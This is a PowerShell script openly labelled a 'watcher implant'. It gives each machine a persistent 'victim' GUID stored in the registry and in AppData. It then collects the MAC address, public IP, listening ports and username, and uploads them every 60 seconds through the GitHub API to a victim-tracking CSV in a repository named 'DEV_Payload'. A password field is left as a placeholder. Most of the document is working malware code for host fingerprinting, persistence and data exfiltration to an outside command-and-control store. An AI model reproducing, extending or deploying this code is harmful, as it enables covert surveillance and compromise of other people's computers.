# ===============================================
# UNIVERSAL WATCHER IMPLANT (REGISTER ONLY, CONFIRM EXISTING GUID)
# ===============================================

# === CONFIGURATION SETTINGS ===
$GitHubToken          = Get-Content -Path "D:\github_token.txt" -Raw
$RepoOwner            = "Umair13303"
$RepoName             = "DEV_Payload"
$CsvPathInRepo        = "GitHub_Script/Excel/Victim_Record_GitHub.csv"

$GuidFile             = "$env:APPDATA\PRE_ATTACK_GUID.txt"
$RegistryKey          = "HKCU:\Software\Microsoft\Windows\CurrentVersion"
$RegistryValue        = "PRE_ATTACK_GUID_REG_KEY"

$LogFile              = "$env:APPDATA\watcher_log.txt"
$LoopIntervalSeconds  = 60
$UserAgent            = "Watcher-Script"

# === LOGGING FUNCTION ===
function Log-Message {
    param ([string]$Text)
    $Text | Out-File -Append $LogFile -Encoding UTF8
    Write-Host $Text
}

# === ADD MessageBox ===
Add-Type -AssemblyName PresentationFramework

Log-Message "[$(Get-Date)] === Watcher started ==="
[System.Windows.MessageBox]::Show("Watcher started.")

# === STEP 1: Load or Generate GUID ===
$Victim_GUID = ""

# Try registry
try {
    $reg = Get-ItemProperty -Path $RegistryKey -Name $RegistryValue -ErrorAction SilentlyContinue
    if ($reg) {
        $Victim_GUID = $reg.$RegistryValue
        Log-Message "[$(Get-Date)] Loaded GUID from registry."
        [System.Windows.MessageBox]::Show("Existing GUID loaded from registry:`n$Victim_GUID")
    }
}
catch {}

# If still empty, try text file
if (-not $Victim_GUID -or $Victim_GUID -eq "") {
    if (Test-Path $GuidFile) {
        $Victim_GUID = Get-Content -Path $GuidFile -Raw
        Log-Message "[$(Get-Date)] Loaded GUID from text file."
        [System.Windows.MessageBox]::Show("Existing GUID loaded from file:`n$Victim_GUID")
    }
}

# If still empty, generate new
if (-not $Victim_GUID -or $Victim_GUID -eq "") {
    $Victim_GUID = [guid]::NewGuid().ToString()
    Set-ItemProperty -Path $RegistryKey -Name $RegistryValue -Value $Victim_GUID -Force
    $Victim_GUID | Out-File -Encoding UTF8 -FilePath $GuidFile
    Log-Message "[$(Get-Date)] New GUID generated and saved."
    [System.Windows.MessageBox]::Show("New GUID generated:`n$Victim_GUID")
}

# === INITIALIZE WEB CLIENT ===
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("Authorization", "token $GitHubToken")
$wc.Headers.Add("User-Agent", $UserAgent)
$wc.Headers.Add("Accept", "application/vnd.github.v3+json")

# === LOOP FOREVER ===
while ($true) {
    try {
        # Fetch CSV metadata
        $MetaURL = "https://api.github.com/repos/$RepoOwner/$RepoName/contents/$CsvPathInRepo"
        $metaJson = $wc.DownloadString($MetaURL)
        $metaObj = ConvertFrom-Json $metaJson
        $downloadUrl = $metaObj.download_url
        $sha = $metaObj.sha

        if (-not $downloadUrl) {
            throw "Failed to get download URL."
        }

        $csvText = $wc.DownloadString($downloadUrl)
        $lines = $csvText -split "`r?`n"

        $alreadyExists = $false

        foreach ($line in $lines) {
            if ($line -match "^\d+,") {
                $cols = $line -split ","
                if ($cols[1] -eq $Victim_GUID) {
                    $alreadyExists = $true
                    break
                }
            }
        }

        if ($alreadyExists) {
            Log-Message "[$(Get-Date)] GUID already registered in CSV."
            [System.Windows.MessageBox]::Show("GUID is already registered:`n$Victim_GUID")
        }
        else {
            # Collect system info
            $macs = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress }
            $mac  = if ($macs.Count -gt 0) { $macs[0].MACAddress } else { "UNKNOWN" }

            try {
                $ip = (New-Object Net.WebClient).DownloadString("https://api.ipify.org")
            } catch { $ip = "UNKNOWN" }

            try {
                $ports = netstat -an | Select-String "LISTENING" | ForEach-Object {
                    ($_ -split "\s+")[-2] -replace ".*:", ""
                }
                $ports = ($ports | Sort-Object -Unique) -join ";"
            } catch { $ports = "UNKNOWN" }

            $user = $env:USERNAME
            $pass = "NOT_CAPTURED"

            # Create new row
            $lastId = 0
            foreach ($line in $lines) {
                if ($line -match "^\d+,") {
                    $id = ($line -split ",")[0]
                    if ([int]::TryParse($id, [ref]$null) -and [int]$id -gt $lastId) {
                        $lastId = [int]$id
                    }
                }
            }
            $newId = $lastId + 1

            $newRow = "$newId,$Victim_GUID,$mac,$ip,$ports,$user,$pass,,," + "FALSE"

            $allLines = $lines + $newRow
            $finalCsv = ($allLines -join "`n")
            $encoded  = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($finalCsv))

            $body = @{
                message = "Register new victim $newId"
                content = $encoded
                sha     = $sha
            } | ConvertTo-Json -Compress

            # Upload updated CSV
            $upload = [System.Net.WebRequest]::Create($MetaURL)
            $upload.Method = "PUT"
            $upload.Headers.Add("Authorization", "token $GitHubToken")
            $upload.ContentType = "application/json"
            $upload.UserAgent = $UserAgent
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
            $reqStream = $upload.GetRequestStream()
            $reqStream.Write($bytes, 0, $bytes.Length)
            $reqStream.Close()
            $upload.GetResponse().Close()

            Log-Message "[$(Get-Date)] ✅ New victim registered."
            [System.Windows.MessageBox]::Show("New victim registered successfully:`n$Victim_GUID")
        }
    }
    catch {
    Log-Message "[$(Get-Date)] ❌ Error: $_"

    if ($_.Exception.Response) {
        $resp = $_.Exception.Response
        $headers = $resp.Headers
        foreach ($key in $headers.Keys) {
            Log-Message "Header: $key = $($headers[$key])"
        }

        # Show headers in a message box
        $headerString = ($headers.Keys | ForEach-Object { "$_=$($headers[$_])" }) -join "`n"
        [System.Windows.MessageBox]::Show("Error headers:`n$headerString")
    }
    else {
        [System.Windows.MessageBox]::Show("Error without response.")
    }
}


    Start-Sleep -Seconds $LoopIntervalSeconds
}
